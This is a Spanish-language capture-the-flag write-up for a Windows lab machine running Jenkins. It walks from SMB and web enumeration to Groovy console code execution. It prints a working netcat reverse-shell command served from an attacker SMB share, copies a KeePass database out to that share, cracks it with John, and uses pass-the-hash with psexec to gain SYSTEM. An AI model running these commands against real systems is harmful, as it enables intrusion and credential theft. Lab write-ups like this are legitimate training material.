## Summary

- IP -> 10.10.10.63
- Ports -> TCP (80,135,445,5000), UDP (idk)
- OS ->  Windows
- Services & Applications
    - 80 -> 
    - 135 -> 
    - 445 ->
    - 5000 ->


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon 
- Comando -> **Whatweb < http:// IP Address>** = Microsoft IIS 10.0
- Comando -> **Whatweb < http:// IP Address> -v** Miramos las cabeceras de la pagina web
- Comando -> **curl -s -X GET "http://< IP>" -I** Miramos las cabeceras de la pagina web (I=i mayuscula,s=silence)
- Comando -> **crackmapexec smb {ip_targeted}** Para listar recursos compartidos de Windows
- Comando -> **smbclient -L < IP TARGET> -N** Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
- Comando -> **smbmap -H** **{ip_targeted}** Herramienta elternativa para ver si nos reporta algo mas
- Comando -> **smbmap -H** **{ip_targeted} -u 'null'** Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)

Webpage -> < IP> and < IP:5000>

- Comando -> **wfuzz -c --hc=404 -t 200 -w < RUTA DICCIONARIO> < http:// URL:PORT/FUZZ/>** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con un diccionario especifico, y el diccionario se aplicara en la palabra FUZZ (c=colorizado, w=wordlist, hc=hidecode, hh=hide characters ch en caso que sea necesario, t=tareas simultaneas). Es importante poner el nombre de la url, ya que muchas veces con la pura IP no encuentra nada. 
	**/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 

Descubrimos una nuerva ruta. 
Ahora toca investigar Jenkins:
	Que es?
	Para que sirve?

El error en la web de Jenkins es que te salga la opcion: **Administrar Jenkins**
	- Ir a consola de Scripts
	- Puedes crear un script en Groovy (Groovy execute shell command)
		println "whoami".execute().text

- Comando -> **locate nc.exe**
- Comando -> **updatedb**


## User
Webpage 
	- Puedes crear un script en Groovy (Groovy execute shell command)
		- **println "\\\\10.10.14.17\\smbFolder\\nc.exe -e cmd 10.10.14.17 443".execute().text** Vamos a crear un recurso compartido smb con nuestra maquina para compartir el nc.exe y despues hacer que cuando lo ejecute nos regrese una consola interactiva por el puerto 443

- Comando -> **impacket-server < FOLDERNAME> $(pwd) -smb2support** Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
- Comando -> **rlwrap nc -nlcp 443** Nos ponemos en escucha por el puerto 443 (Podemos hacer **Ctrl + l**, sin poder hacer **Ctrl + c**) maquinas Windows

nota: Si nos marca un error al moento de ejecutar la parte de la pagina web, debemos de escapar las barras agregando otra barra **\\**

- Comando-> **dir /r /s user.txt** Para buscar un archivo dentro de Windows, nos regresa la ruta en donde se encuentra

## Root

#### 1ra parte para convertirse en root:
En **C:\\Users\\kohsuke\\Documents** Encontramos un archivo con extencion **.kdbx** 

**copy CEH.kdbx \\\\10.10.14.17\\smbFolder\\CEH.kdbx** Copiamos un archivo de la maquina victima a nuestra maquina de atacante
		- CEH.kdbx -> Nombre dek archivo que nos queremos copiar de la maquina victima
		- 10.10.14.17 -> Nuestra direccion IP
		- smbFolder -> Nombre de la carpeta del recurso compartido 

- Comando -> **file < FILE>** Nos muestra que tipo de archivo es por los magic numbers, y asi saber que es un keepass

- Comando -> **keepassxc CEH.kdbx** Nos permite abrir el archivo keepass teniendo la passwd, de lo contrario hacemos lo siguiente
- Comando -> **keepass2john CEH.kdbx > hash** Si no sabemos la passwd, esto no sayuda a extraer un hash para poder hacer fuerza bruta
- Comando -> **john --wordlist=/usr/share/wordlists/rockyou.txt hash** Aplicamos un ataque de fuerza bruta a un archivo hash

Obtenemos otro hash pero de la herramienta Keepass, por lo que podriamos hacer un 'Pass the hash'
- Comando -> **crackmapexec smb < IP TARGET> -u <‘Administrator’> -H <‘HASH’>** Con este comando verificamos que el usuario y su hash son validos y si es asi nos pondra un [+] Pwn3d!.
- Comando -> **psexec.py WORKGROUP/Administrator@< IP> -hashes <'HASH'>** Podremos ganar acceso al sistema y nos lanzara una cmd ya que estariamos haciendo un Pass de Hash 

Y seriamos nt authority\\System

ADS Alternate Data Strings 
	Comando -> **dir /r /s** Para listar informacion oculta
	Comando -> **more < hm.txt:root.txt** Miramos el contenido de un archivo oculto 


#### 2da parte para convertirse en root
1:29:00 Video para la segunda parte